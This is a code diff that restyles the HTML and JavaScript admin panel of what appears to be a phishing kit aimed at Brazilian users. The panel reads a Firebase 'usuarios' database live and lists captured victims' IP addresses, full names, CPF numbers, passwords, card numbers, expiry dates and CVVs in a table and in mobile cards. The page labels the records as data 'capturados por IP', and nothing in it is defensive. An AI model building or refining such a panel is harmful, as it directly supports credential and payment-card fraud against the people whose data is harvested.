@@ -2,45 +2,220 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>Painel de Controle - Terminal</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Painel Administrativo - Monitoramento</title>
     <style>
+        :root {
+            --bg-main: #f8fafc;
+            --bg-card: #ffffff;
+            --text-primary: #0f172a;
+            --text-secondary: #64748b;
+            --border-color: #e2e8f0;
+            --success-bg: #f0fdf4;
+            --success-text: #166534;
+            --badge-ip-bg: #f1f5f9;
+            --badge-ip-text: #334155;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
         body {
-            background-color: #0d0d0d;
-            color: #00ff41;
-            font-family: 'Courier New', Courier, monospace;
-            padding: 20px;
+            background-color: var(--bg-main);
+            color: var(--text-primary);
+            padding: 24px;
+            min-height: 100vh;
         }
-        .terminal {
-            border: 1px solid #333;
-            padding: 20px;
-            max-width: 800px;
-            margin: auto;
-            background: #000;
+
+        .dashboard-container {
+            max-width: 1250px;
+            margin: 0 auto;
         }
-        .header {
-            border-bottom: 1px solid #333;
-            margin-bottom: 20px;
-            padding-bottom: 10px;
-            color: #fff;
+
+        .dashboard-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 24px;
+            background: var(--bg-card);
+            padding: 20px 24px;
+            border-radius: 12px;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 1px 3px rgba(0,0,0,0.02);
         }
-        .log-entry {
-            margin-bottom: 10px;
-            padding: 5px;
-            border-left: 3px solid #00ff41;
-            background: #111;
+
+        .header-title h1 {
+            font-size: 20px;
+            font-weight: 700;
+            color: var(--text-primary);
         }
-        .timestamp { color: #888; margin-right: 10px; }
-        .ip-address { color: #ffeb3b; margin-right: 10px; font-weight: bold; }
-        .data { color: #fff; }
+
+        .header-title p {
+            font-size: 13px;
+            color: var(--text-secondary);
+            margin-top: 2px;
+        }
+
+        .status-badge {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: var(--success-bg);
+            color: var(--success-text);
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            background-color: #22c55e;
+            border-radius: 50%;
+        }
+
+        .card-panel {
+            background: var(--bg-card);
+            border-radius: 12px;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 4px 6px -1px rgba(0,0,0,0.02);
+            overflow: hidden;
+        }
+
+        .table-responsive {
+            width: 100%;
+            overflow-x: auto;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            text-align: left;
+            white-space: nowrap;
+        }
+
+        th {
+            background-color: #f8fafc;
+            color: var(--text-secondary);
+            font-weight: 600;
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            padding: 14px 16px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        td {
+            padding: 16px;
+            border-bottom: 1px solid var(--border-color);
+            font-size: 13px;
+            color: var(--text-primary);
+        }
+
+        tr:hover td {
+            background-color: #f8fafc;
+        }
+
+        .badge-ip {
+            background-color: var(--badge-ip-bg);
+            color: var(--badge-ip-text);
+            padding: 4px 8px;
+            border-radius: 6px;
+            font-family: monospace;
+            font-size: 12px;
+            border: 1px solid #e2e8f0;
+        }
+
+        .badge-senha {
+            background-color: #e0f2fe;
+            color: #0369a1;
+            padding: 4px 8px;
+            border-radius: 6px;
+            font-family: monospace;
+            font-weight: 600;
+        }
+
+        .badge-cartao {
+            background-color: #fef3c7;
+            color: #b45309;
+            padding: 4px 8px;
+            border-radius: 6px;
+            font-family: monospace;
+            font-weight: 600;
+        }
+
+        .text-muted {
+            color: #94a3b8;
+            font-size: 12px;
+        }
+
+        .empty-state {
+            text-align: center;
+            padding: 60px 20px;
+            color: var(--text-secondary);
+            font-size: 14px;
+        }
+
+        /* Mobile Cards */
+        .mobile-cards { display: none; }
+
+        @media (max-width: 768px) {
+            body { padding: 8px; }
+            .dashboard-header { flex-direction: column; align-items: flex-start; gap: 10px; padding: 14px; }
+            .table-responsive { display: none; }
+            .mobile-cards { display: flex; flex-direction: column; gap: 12px; padding: 10px; }
+            .m-card {
+                background: var(--bg-card);
+                border: 1px solid var(--border-color);
+                border-radius: 10px;
+                padding: 14px;
+                display: flex;
+                flex-direction: column;
+                gap: 10px;
+            }
+            .m-card-row { display: flex; justify-content: space-between; align-items: center; font-size: 13px; }
+            .m-card-label { font-size: 11px; font-weight: 600; color: var(--text-secondary); text-transform: uppercase; }
+            .m-divider { height: 1px; background-color: var(--border-color); }
+        }
     </style>
 </head>
 <body>
-    <div class="terminal">
-        <div class="header">
-            <h2>>_ SISTEMA DE MONITORAMENTO [ATIVA]</h2>
-        </div>
-        <div id="log-container">
-            <!-- Os dados serão carregados aqui -->
+    <div class="dashboard-container">
+        <header class="dashboard-header">
+            <div class="header-title">
+                <h1>Painel de Logs Unificado</h1>
+                <p>Dados de acesso e recuperação capturados por IP</p>
+            </div>
+            <div class="status-badge">
+                <div class="status-dot"></div>
+                <span>Online</span>
+            </div>
+        </header>
+
+        <div class="card-panel">
+            <div class="table-responsive">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Horário</th>
+                            <th>IP</th>
+                            <th>Nome Completo</th>
+                            <th>CPF</th>
+                            <th>Senha</th>
+                            <th>Cartão</th>
+                            <th>Validade / CVV</th>
+                        </tr>
+                    </thead>
+                    <tbody id="tabela-corpo"></tbody>
+                </table>
+            </div>
+
+            <div class="mobile-cards" id="cards-corpo"></div>
         </div>
     </div>
 
@@ -60,27 +235,78 @@
 
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
-        const logContainer = document.getElementById('log-container');
+        
+        const corpoTabela = document.getElementById('tabela-corpo');
+        const corpoCards = document.getElementById('cards-corpo');
 
-        // Escuta as alterações no banco de dados em tempo real
         const usuariosRef = ref(db, 'usuarios/');
         onValue(usuariosRef, (snapshot) => {
-            logContainer.innerHTML = ''; // Limpa logs anteriores
+            corpoTabela.innerHTML = '';
+            corpoCards.innerHTML = '';
             const data = snapshot.val();
             
             if (data) {
                 Object.values(data).forEach(user => {
-                    const entry = document.createElement('div');
-                    entry.className = 'log-entry';
-                    entry.innerHTML = `
-                        <span class="timestamp">[${user.dataUltimoAcesso}]</span>
-                        <span class="ip-address">IP: ${user.ip}</span>
-                        <span class="data">CPF: ${user.cpf}</span>
+                    const dataFormatada = user.dataUltimoAcesso ? new Date(user.dataUltimoAcesso).toLocaleString('pt-BR') : '-';
+                    const ip = user.ip || '-';
+                    const nome = user.nomeCompleto || '<span class="text-muted">Aguardando...</span>';
+                    const cpf = user.cpf ? `<b>${user.cpf}</b>` : '<span class="text-muted">Pendente</span>';
+                    const senha = user.senha ? `<span class="badge-senha">${user.senha}</span>` : '<span class="text-muted">-</span>';
+                    const cartao = user.cartao ? `<span class="badge-cartao">${user.cartao}</span>` : '<span class="text-muted">-</span>';
+                    const validadeCvv = (user.validade && user.cvv) ? `${user.validade} / ${user.cvv}` : '<span class="text-muted">-</span>';
+
+                    // Tabela Desktop
+                    const tr = document.createElement('tr');
+                    tr.innerHTML = `
+                        <td style="color: var(--text-secondary);">${dataFormatada}</td>
+                        <td><span class="badge-ip">${ip}</span></td>
+                        <td><b>${nome}</b></td>
+                        <td>${cpf}</td>
+                        <td>${senha}</td>
+                        <td>${cartao}</td>
+                        <td>${validadeCvv}</td>
                     `;
-                    logContainer.appendChild(entry);
+                    corpoTabela.appendChild(tr);
+
+                    // Cards Mobile
+                    const card = document.createElement('div');
+                    card.className = 'm-card';
+                    card.innerHTML = `
+                        <div class="m-card-row">
+                            <span class="m-card-label">Horário</span>
+                            <span style="font-size: 12px; color: var(--text-secondary);">${dataFormatada}</span>
+                        </div>
+                        <div class="m-card-row">
+                            <span class="m-card-label">IP</span>
+                            <span class="badge-ip">${ip}</span>
+                        </div>
+                        <div class="m-divider"></div>
+                        <div class="m-card-row">
+                            <span class="m-card-label">Nome</span>
+                            <b>${nome}</b>
+                        </div>
+                        <div class="m-card-row">
+                            <span class="m-card-label">CPF</span>
+                            <span>${cpf}</span>
+                        </div>
+                        <div class="m-card-row">
+                            <span class="m-card-label">Senha</span>
+                            <div>${senha}</div>
+                        </div>
+                        <div class="m-card-row">
+                            <span class="m-card-label">Cartão</span>
+                            <div>${cartao}</div>
+                        </div>
+                        <div class="m-card-row">
+                            <span class="m-card-label">Validade / CVV</span>
+                            <span>${validadeCvv}</span>
+                        </div>
+                    `;
+                    corpoCards.appendChild(card);
                 });
             } else {
-                logContainer.innerHTML = '<p>Nenhum dado capturado ainda.</p>';
+                corpoTabela.innerHTML = `<tr><td colspan="7" class="empty-state">Nenhum registro encontrado no banco de dados.</td></tr>`;
+                corpoCards.innerHTML = `<div class="empty-state">Nenhum registro encontrado no banco de dados.</div>`;
             }
         });
     </script>
